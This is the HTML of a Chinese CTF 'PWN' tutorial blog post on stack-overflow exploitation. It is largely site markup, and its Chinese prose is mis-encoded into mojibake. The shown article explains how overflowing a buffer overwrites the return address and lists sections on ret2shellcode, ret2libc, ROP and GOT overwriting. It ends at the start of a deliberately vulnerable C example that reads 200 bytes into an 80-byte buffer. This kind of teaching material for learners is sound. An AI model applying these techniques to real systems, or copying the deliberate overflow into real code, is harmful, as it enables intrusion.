<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼Œæ ˆ">
<title>PWN-2</title>

<link rel='canonical' href='https://expl0rer.top/p/pwn-2/'>

<link rel="stylesheet" href="/scss/style.min.4bd4146745b8cfb7d738bd4abe865979f0ea7240549e1e4a81cc0e68784b07a0.css"><meta property='og:title' content="PWN-2">
<meta property='og:description' content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼Œæ ˆ">
<meta property='og:url' content='https://expl0rer.top/p/pwn-2/'>
<meta property='og:site_name' content='Expl0rer.Ct'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-25T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-25T18:19:52&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/pwn-2/PWN2.png' />
<meta name="twitter:title" content="PWN-2">
<meta name="twitter:description" content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼Œæ ˆ"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://expl0rer.top/p/pwn-2/PWN2.png' />
    <link rel="shortcut icon" href="/favicon.ico" />
<div class="loading">
     
    <div id="ghost">
        <div id="red">
            <div id="pupil"></div>
            <div id="pupil1"></div>
            <div id="eye"></div>
            <div id="eye1"></div>
            <div id="top0"></div>
            <div id="top1"></div>
            <div id="top2"></div>
            <div id="top3"></div>
            <div id="top4"></div>
            <div id="st0"></div>
            <div id="st1"></div>
            <div id="st2"></div>
            <div id="st3"></div>
            <div id="st4"></div>
            <div id="st5"></div>
            <div id="an1"></div>
            <div id="an2"></div>
            <div id="an3"></div>
            <div id="an4"></div>
            <div id="an5"></div>
            <div id="an6"></div>
            <div id="an7"></div>
            <div id="an8"></div>
            <div id="an9"></div>
            <div id="an10"></div>
            <div id="an11"></div>
            <div id="an12"></div>
            <div id="an13"></div>
            <div id="an14"></div>
            <div id="an15"></div>
            <div id="an16"></div>
            <div id="an17"></div>
            <div id="an18"></div>
        </div>
        <div id="shadow"></div>
    </div>
</div>

<style>
    .loading {
        position: fixed;
        display: flex;
        justify-content: center;
        align-items: center;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 99;
        background-color: #f5f5fa;
        transition: opacity 0.5s ease;
    }
	
      
#ghost {
  position: relative;
  scale: 0.8;
}

#red {
  animation: upNDown infinite 1s;
  position: relative;
  width: 140px;
  height: 140px;
  display: grid;
  grid-template-columns: repeat(14, 1fr);
  grid-template-rows: repeat(14, 1fr);
  grid-column-gap: 0px;
  grid-row-gap: 0px;
  grid-template-areas:
    "a1  a2  a3  a4  a5  top0  top0  top0  top0  a10 a11 a12 a13 a14"
    "b1  b2  b3  top1 top1 top1 top1 top1 top1 top1 top1 b12 b13 b14"
    "c1 c2 top2 top2 top2 top2 top2 top2 top2 top2 top2 top2 c13 c14"
    "d1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 d14"
    "e1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 e14"
    "f1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 f14"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "st0 st0 an4 st1 an7 st2 an10 an10 st3 an13 st4 an16 st5 st5"
    "an1 an2 an3 an5 an6 an8 an9 an9 an11 an12 an14 an15 an17 an18";
}

@keyframes upNDown {
  0%,
  49% {
    transform: translateY(0px);
  }
  50%,
  100% {
    transform: translateY(-10px);
  }
}

#top0,
#top1,
#top2,
#top3,
#top4,
#st0,
#st1,
#st2,
#st3,
#st4,
#st5 {
  background-color: red;
}

#top0 {
  grid-area: top0;
}

#top1 {
  grid-area: top1;
}

#top2 {
  grid-area: top2;
}

#top3 {
  grid-area: top3;
}

#top4 {
  grid-area: top4;
}

#st0 {
  grid-area: st0;
}

#st1 {
  grid-area: st1;
}

#st2 {
  grid-area: st2;
}

#st3 {
  grid-area: st3;
}

#st4 {
  grid-area: st4;
}

#st5 {
  grid-area: st5;
}

#an1 {
  grid-area: an1;
  animation: flicker0 infinite 1s;
}

#an18 {
  grid-area: an18;
  animation: flicker0 infinite 1s;
}

#an2 {
  grid-area: an2;
  animation: flicker1 infinite 1s;
}

#an17 {
  grid-area: an17;
  animation: flicker1 infinite 1s;
}

#an3 {
  grid-area: an3;
  animation: flicker1 infinite 1s;
}

#an16 {
  grid-area: an16;
  animation: flicker1 infinite 1s;
}

#an4 {
  grid-area: an4;
  animation: flicker1 infinite 1s;
}

#an15 {
  grid-area: an15;
  animation: flicker1 infinite 1s;
}

#an6 {
  grid-area: an6;
  animation: flicker0 infinite 1s;
}

#an12 {
  grid-area: an12;
  animation: flicker0 infinite 1s;
}

#an7 {
  grid-area: an7;
  animation: flicker0 infinite 1s;
}

#an13 {
  grid-area: an13;
  animation: flicker0 infinite 1s;
}

#an9 {
  grid-area: an9;
  animation: flicker1 infinite 1s;
}

#an10 {
  grid-area: an10;
  animation: flicker1 infinite 1s;
}

#an8 {
  grid-area: an8;
  animation: flicker0 infinite 1s;
}

#an11 {
  grid-area: an11;
  animation: flicker0 infinite 1s;
}

@keyframes flicker0 {
  0%,
  49% {
    background-color: red;
  }
  50%,
  100% {
    background-color: transparent;
  }
}

@keyframes flicker1 {
  0%,
  49% {
    background-color: transparent;
  }
  50%,
  100% {
    background-color: red;
  }
}

#eye {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  left: 10px;
}

#eye::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#eye1 {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  right: 30px;
}

#eye1::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye1::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#pupil {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  left: 10px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

#pupil1 {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  right: 50px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

@keyframes eyesMovement {
  0%,
  49% {
    transform: translateX(0px);
  }
  50%,
  99% {
    transform: translateX(10px);
  }
  100% {
    transform: translateX(0px);
  }
}

#shadow {
  background-color: black;
  width: 140px;
  height: 140px;
  position: absolute;
  border-radius: 50%;
  transform: rotateX(80deg);
  filter: blur(20px);
  top: 80%;
  animation: shadowMovement infinite 1s;
}

@keyframes shadowMovement {
  0%,
  49% {
    opacity: 0.5;
  }
  50%,
  100% {
    opacity: 0.2;
  }
}

</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>

<script>	
    function initLoading() {
        let loading = document.querySelector(".loading");
        document.addEventListener('DOMContentLoaded', function() {
            
            setTimeout(() => {
                loading.style.opacity = "0";
                
                setTimeout(() => {
                    loading.style.display = "none";
                }, 500);
            }, 500); 
        });
    }

    initLoading();
</script>


<link
  rel="stylesheet"
  href="https://cdn-font.hyperos.mi.com/font/css?family=MiSans:400:Chinese_Simplify,Latin&display=swap"
/>



<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreenr.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreenr.css" />


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_1a3c99934e119e1b.png" width="300"
                            height="268" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ«¡</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Expl0rer.Ct</a></h1>
            <h2 class="site-description">å¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/695179979?spm_id_from=333.40138.0.0'
                        target="_blank"
                        title="Bilibili"
                        rel="me"
                    >
                        
                        
                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/Expl0rer-Ct'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ | Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E-about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº | About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£ | Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢ | Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>æŠ€æœ¯é“¾æ¥ | Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <!--
tags: [temperature, hot, wheater, thermometer, forecast]
category: Weather
version: "1.73"
unicode: "f236"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#ff9500"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-sun-high"
>
  <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" />
  <path d="M6.343 17.657l-1.414 1.414" />
  <path d="M6.343 6.343l-1.414 -1.414" />
  <path d="M17.657 6.343l1.414 -1.414" />
  <path d="M17.657 17.657l1.414 1.414" />
  <path d="M4 12h-2" />
  <path d="M12 4v-2" />
  <path d="M20 12h2" />
  <path d="M12 20v2" />
</svg>

                        <!--
tags: [night, dark mode]
category: Weather
version: "1.21"
unicode: "ece7"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#8d6e63"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-moon-stars"
>
  <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
  <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2" />
  <path d="M19 11h2m-1 -1v2" />
</svg>

                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#æ ˆæº¢å‡ºåŸç†">æ ˆæº¢å‡ºåŸç†</a>
      <ol>
        <li><a href="#æ ˆæº¢å‡º">æ ˆæº¢å‡º</a></li>
        <li><a href="#æ ˆæº¢å‡ºåœ¨ctfä¸­çš„åº”ç”¨">æ ˆæº¢å‡ºåœ¨CTFä¸­çš„åº”ç”¨</a></li>
      </ol>
    </li>
    <li><a href="#åŸºæœ¬æ ˆæº¢å‡º">åŸºæœ¬æ ˆæº¢å‡º</a>
      <ol>
        <li><a href="#æ ˆæº¢å‡ºæ¡ˆä¾‹ret2shellcode">æ ˆæº¢å‡ºæ¡ˆä¾‹ï¼šret2shellcode</a>
          <ol>
            <li><a href="#æ–¹æ³•ä¸€ç”Ÿæˆpayloadè„šæœ¬åŠ«æŒ">æ–¹æ³•ä¸€ï¼šç”Ÿæˆpayloadè„šæœ¬åŠ«æŒ</a></li>
            <li><a href="#æ–¹æ³•äºŒåˆ©ç”¨æ ˆæº¢å‡ºè·³è½¬åˆ°shellcode">æ–¹æ³•äºŒï¼šåˆ©ç”¨æ ˆæº¢å‡ºè·³è½¬åˆ°shellcode</a></li>
          </ol>
        </li>
        <li><a href="#ret2libc">ret2libc</a></li>
      </ol>
    </li>
    <li><a href="#rop-å‰ä¼ ">ROP å‰ä¼ </a></li>
    <li><a href="#rop">ROP++</a>
      <ol>
        <li><a href="#æ ˆè½¬ç§»">æ ˆè½¬ç§»</a>
          <ol>
            <li><a href="#æ ˆè½¬ç§»ç¬¬ä¸€ç§æ–¹æ³•">æ ˆè½¬ç§»ç¬¬ä¸€ç§æ–¹æ³•</a></li>
            <li><a href="#æ ˆè½¬ç§»ç¬¬äºŒç§æ–¹æ³•">æ ˆè½¬ç§»ç¬¬äºŒç§æ–¹æ³•</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#æ”¹å†™gotè¡¨getshellæ–¹æ³•">æ”¹å†™.gotè¡¨getshellæ–¹æ³•</a></li>
    <li><a href="#pwnæ ˆæº¢å‡ºé¢˜çš„ä¸€èˆ¬è§£é¢˜æ€è·¯">PWNæ ˆæº¢å‡ºé¢˜çš„ä¸€èˆ¬è§£é¢˜æ€è·¯</a>
      <ol>
        <li><a href="#ç¬¬ä¸€æ­¥æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯checksecçœ‹æ¶æ„ä¿æŠ¤ä¿¡æ¯">ç¬¬ä¸€æ­¥ã€æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼ˆchecksecçœ‹æ¶æ„ã€ä¿æŠ¤ä¿¡æ¯ï¼‰</a></li>
        <li><a href="#ç¬¬äºŒæ­¥ç†æ¸…å‡½æ•°é€»è¾‘å¦‚ä½•æ‰§è¡Œ">ç¬¬äºŒæ­¥ã€ç†æ¸…å‡½æ•°é€»è¾‘ï¼ˆå¦‚ä½•æ‰§è¡Œï¼Ÿï¼‰</a></li>
        <li><a href="#ç¬¬ä¸‰æ­¥æ‰¾åˆ°æ¼æ´æ ˆå †getså‡½æ•°systemexecv">ç¬¬ä¸‰æ­¥ã€æ‰¾åˆ°æ¼æ´ï¼ˆæ ˆï¼Ÿå †ï¼Ÿgetså‡½æ•°ã€systemã€execvï¼‰</a></li>
        <li><a href="#ç¬¬å››æ­¥æ¼æ´åˆ©ç”¨å†™exppayload">ç¬¬å››æ­¥ã€æ¼æ´åˆ©ç”¨ï¼ˆå†™expã€payloadï¼‰</a>
          <ol>
            <li><a href="#åœ°å€é—®é¢˜"><strong>åœ°å€é—®é¢˜</strong></a></li>
            <li><a href="#canaryå’Œnxé—®é¢˜"><strong>canaryå’ŒNXé—®é¢˜</strong></a></li>
            <li><a href="#ç¨‹åºæœ¬èº«çš„é™åˆ¶">ç¨‹åºæœ¬èº«çš„é™åˆ¶</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#å®Œç»“">å®Œç»“</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/pwn-2/">
                <img src="/p/pwn-2/PWN2_hu_cafa03fd2ca82e41.png"
                        srcset="/p/pwn-2/PWN2_hu_cafa03fd2ca82e41.png 800w, /p/pwn-2/PWN2_hu_68137e0e54d11b98.png 1600w"
                        width="800" 
                        height="450" 
                        loading="lazy"
                        alt="Featured image of post PWN-2" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
                CTF_writeup
            </a>
        
            <a href="/categories/ctfpwn/" style="background-color: #2a9d8f; color: #fff;">
                CTFpwn
            </a>
        
            <a href="/categories/pwn%E5%85%A5%E9%97%A8/" style="background-color: #2a9d8f; color: #fff;">
                PWNå…¥é—¨
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/pwn-2/">PWN-2</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼Œæ ˆ
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-08-25</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p><strong>å‰æ–‡ï¼šä»¥ä¸‹æ˜¯æˆ‘å…¥é—¨PWNçš„è®°å½•ï¼Œæ¬¢è¿å„ä½å‰æ¥è§‚çœ‹ï¼Œå°å¼Ÿé¢†æ•™ï¼</strong></p>
<p>[TOC]</p>
<p>ç»§ä¸Šä¸€å¤§ç« çš„åŸºç¡€å­¦ ä¹ åï¼Œå¯¹PWNæœ‰äº†ä¸€å®šäº†è§£ï¼ŒçŸ¥é“ä¸€äº›ä¸“åè¯ã€ä¸€äº›ä¿æŠ¤æœºåˆ¶çš„å·¥ä½œæµç¨‹ã€æ±‡ç¼–è¯­è¨€ç­‰ï¼Œæ¥ä¸‹æ¥çš„å‡ ç« å¼€å§‹æ­£å¼å­¦ä¹ äºŒè¿›åˆ¶çš„æ¼æ´åˆ©ç”¨å’ŒåŸç†ã€‚</p>
<p><em><strong>æ ˆæ˜¯PWNæ¯”è¾ƒå¸¸è§çš„çªç ´ç‚¹</strong></em></p>
<h2 id="æ ˆæº¢å‡ºåŸç†">æ ˆæº¢å‡ºåŸç†
</h2><p>åœ¨ä¸Šä¸€å¤§ç« çš„å‡½æ•°è°ƒç”¨çº¦å®šä¸­ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ï¼š
è°ƒç”¨å‡½æ•°ï¼šåªéœ€è¦å°†ripå‹æ ˆï¼Œå³push ripï¼Œç„¶åè®²ripèµ‹å€¼ä¸ºè¢«è°ƒç”¨å‡½æ•°çš„èµ·å§‹åœ°å€ï¼Œè¿™ä¸€æ“ä½œè¢«éšæ€§çš„å†…ç½®åœ¨callæŒ‡ä»¤ä¸­ã€‚</p>
<p>è¢«è°ƒç”¨å‡½æ•°ï¼špush rbpï¼› mov rbp rspï¼›sub rsp oxxxã€‚å³ä¿å­˜è°ƒç”¨å‡½æ•°çš„rbpæŒ‡é’ˆï¼Œå°†è‡ªå·±çš„rbpæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç„¶åå¼€è¾Ÿæ ˆç©ºé—´ç»™è‡ªå·±ç”¨,æ­¤æ—¶rbpå°±å˜æˆäº†è¢«è°ƒç”¨å‡½æ•°çš„æ ˆåº•ã€‚</p>
<p>å‡½æ•°è¿”å›ï¼šleaveï¼›retï¼›ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼šmov rsp rbpï¼›pop rbpï¼›pop ripï¼›å³æ¢å¤æ ˆå¸§ï¼Œè¿”å›è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p>
<p><strong>æ ˆçš„ä½œç”¨ä¸ºå­˜å‚¨å‡½æ•°è°ƒç”¨ç›¸å…³ä¿¡æ¯ä»¥åŠå‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</strong></p>
<p>è¿™äº›å±€éƒ¨å˜é‡é€šå¸¸ä¸ºæ•°ç»„æˆ–è€…è¾“å…¥çš„ç¼“å†²åŒºï¼ˆbufï¼‰ã€‚è€Œå‡½æ•°è°ƒç”¨ç›¸å…³çš„ä¿¡æ¯ï¼Œä¸»è¦æ˜¯è¿”å›åœ°å€å’Œæ ˆåº•æŒ‡é’ˆï¼ˆrbpï¼‰ã€‚</p>
<h3 id="æ ˆæº¢å‡º">æ ˆæº¢å‡º
</h3><p>å‡½æ•°ä¸­çš„å­˜å‚¨åœ¨æ‰¾ä¸­çš„å±€éƒ¨å˜é‡æ•°ç»„è¾¹ç•Œæ£€æŸ¥ä¸ä¸¥æ ¼å‘ç”Ÿè¶Šç•Œå†™ï¼Œé€ æˆç”¨æˆ·è¾“å…¥è¦†ç›–åˆ°ç¼“å†²åŒºå¤–çš„æ•°æ®å†…å®¹ã€‚</p>
<p>ç”±äºæ ˆä¸­åŒæ—¶å­˜åœ¨ç€ä¸å‡½æ•°è°ƒç”¨å‚æ•°çš„ç›¸å…³ä¿¡æ¯ï¼Œæ ˆæº¢å‡ºå¯ä»¥å¯¼è‡´<strong>æ§åˆ¶æµåŠ«æŒ</strong>ã€‚</p>
<p>æ¥è®©æˆ‘è§£é‡Šä¸€ä¸‹ï¼š</p>
<ol>
<li>è‹¥ç”¨æˆ·è¾“å…¥é•¿åº¦è¶…è¿‡æ•°ç»„å®¹é‡ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼š<strong>å‘ä¸Šè¦†ç›–æ ˆä¸­æ›´é«˜åœ°å€çš„æ•°æ®</strong>ï¼ˆå› ä¸ºæ ˆå‘ä¸‹ç”Ÿé•¿ï¼Œè¶Šç•Œå†™ä¼šå‘é«˜åœ°å€è”“å»¶ï¼‰ï¼›</li>
<li>å½“è¦†ç›–åˆ° â€œè¿”å›åœ°å€â€ æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥å°†å…¶ä¿®æ”¹ä¸º<strong>ä»»æ„åœ°å€</strong>ï¼ˆå¦‚ shellcode åœ°å€ã€ROP gadget åœ°å€ç­‰ï¼‰ï¼›</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt; // åŒ…å«readå‡½æ•°å£°æ˜</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// å­˜åœ¨æ¼æ´çš„å‡½æ•°ï¼šè¯»å–200å­—èŠ‚åˆ°80å­—èŠ‚çš„ç¼“å†²åŒº
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">func_a</span><span class="p">()</span> <span class="p">{</span>
